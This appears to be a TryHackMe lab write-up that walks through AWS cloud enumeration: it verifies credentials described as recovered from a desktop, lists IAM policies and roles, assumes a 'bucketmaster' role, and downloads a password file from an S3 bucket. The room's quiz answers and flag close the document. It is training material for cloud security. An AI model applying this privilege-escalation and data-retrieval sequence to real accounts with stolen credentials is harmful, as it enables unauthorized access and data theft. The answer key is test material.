# AWS Security - S3cret Santa

<img width="900" height="900" alt="5ed5961c6276df568891c3ea-1761886566945" src="https://github.com/user-attachments/assets/30530d8e-6e22-4dd1-be06-5ed06fc819ae" />


https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6

---

An infiltrated elf has recovered a set of AWS cloud credentials from Sir Carrotbane’s desktop. Our goal is to use these credentials to regain access to TBFC’s cloud environment by enumerating permissions, identifying privilege escalation paths, and accessing exposed cloud resources.

## Step 1: Verifying AWS Credentials

The AWS CLI is already configured with the recovered credentials, which are stored at:

`~/.aws/credentials`

To confirm the credentials work and identify the associated user, use AWS Security Token Service:

`aws sts get-caller-identity`

The output confirms:

- The credentials are valid
    
- The AWS account ID
    
- The identity belongs to the IAM user `sir.carrotbane`
    

This confirms we have authenticated access to TBFC’s AWS account.

---

## Step 2: Understanding IAM Components

AWS uses Identity and Access Management (IAM) to control access to resources.

Key IAM components:

- **Users** represent individual identities with long term credentials
    
- **Groups** are collections of users that share permissions
    
- **Roles** are temporary identities that can be assumed to gain additional permissions
    
- **Policies** define what actions are allowed, on which resources, and under what conditions
    

Misconfigured IAM permissions are a common source of cloud breaches.

---

## Step 3: Enumerating IAM Users

With valid credentials, begin enumeration by listing IAM users:

`aws iam list-users`

This reveals all user accounts in the AWS environment, along with metadata such as creation timestamps.

---

## Step 4: Enumerating User Policies

Next, identify what permissions Sir Carrotbane has.

Check for inline policies:

`aws iam list-user-policies --user-name sir.carrotbane`

An inline policy is present. Note its name.

Check for attached (managed) policies:

`aws iam list-attached-user-policies --user-name sir.carrotbane`

No attached policies are found.

Check group membership:

`aws iam list-groups-for-user --user-name sir.carrotbane`

The user is not a member of any groups.

---

## Step 5: Inspecting the Inline Policy

Retrieve the contents of the inline policy:

`aws iam get-user-policy --policy-name POLICYNAME --user-name sir.carrotbane`

The policy allows extensive enumeration permissions, including:

- Listing users, groups, roles, and policies
    
- Retrieving policy documents
    
- Performing `sts:AssumeRole`
    

While direct access to resources is limited, the ability to assume roles provides a potential privilege escalation path.

---

## Step 6: Enumerating IAM Roles

Since role assumption is permitted, list available roles:

`aws iam list-roles`

A role named `bucketmaster` is identified. Its trust policy explicitly allows `sir.carrotbane` to assume it.

---

## Step 7: Enumerating Role Policies

Check inline policies for the role:

`aws iam list-role-policies --role-name bucketmaster`

Check attached policies:

`aws iam list-attached-role-policies --role-name bucketmaster`

The role has a single inline policy. Retrieve its contents:

`aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy`

The policy grants permissions to:

- List all S3 buckets
    
- List objects in specific buckets
    
- Retrieve objects from the `easter-secrets-123145` bucket
    

This confirms that assuming the role provides access to S3 data.

---

## Step 8: Assuming the Role

Use STS to assume the `bucketmaster` role:

`aws sts assume-role \   --role-arn arn:aws:iam::123456789012:role/bucketmaster \   --role-session-name TBFC`

The response includes temporary credentials:

- AccessKeyId
    
- SecretAccessKey
    
- SessionToken
    

Export these values into the environment:

`export AWS_ACCESS_KEY_ID="ASIA..." export AWS_SECRET_ACCESS_KEY="..." export AWS_SESSION_TOKEN="..."`

Verify the role assumption:

`aws sts get-caller-identity`

The identity should now reflect the `bucketmaster` assumed role.

---

## Step 9: Understanding Amazon S3

Amazon S3 is an object storage service used to store files such as documents, images, logs, and backups. Objects are stored inside containers called buckets.

Buckets are commonly misconfigured and often contain sensitive data.

---

## Step 10: Enumerating S3 Buckets

With the new role permissions, list all S3 buckets:

`aws s3api list-buckets`

One bucket of interest references easter themed content.

---

## Step 11: Listing Bucket Contents

List objects in the bucket:

`aws s3api list-objects --bucket easter-secrets-123145`

A file named `cloud_password.txt` is discovered.

---

## Step 12: Exfiltrating Sensitive Data

Download the file to the local machine:

`aws s3api get-object \   --bucket easter-secrets-123145 \   --key cloud_password.txt \   cloud_password.txt`

The file is successfully retrieved, confirming unauthorized access to sensitive cloud data.

---

Q: What IAM component is used to describe the permissions to be assigned to a user or a group?

A: Policy

Q: What is the name of the policy assigned to `sir.carrotbane`?

A: SirCarrotbanePolicy

Q: Apart from GetObject and ListBucket, what other action can be taken by assuming the bucketmaster role?

A: ListAllMyBuckets

Q: What are the contents of the cloud_password.txt file?

A: THM{more_like_sir_cloudbane}
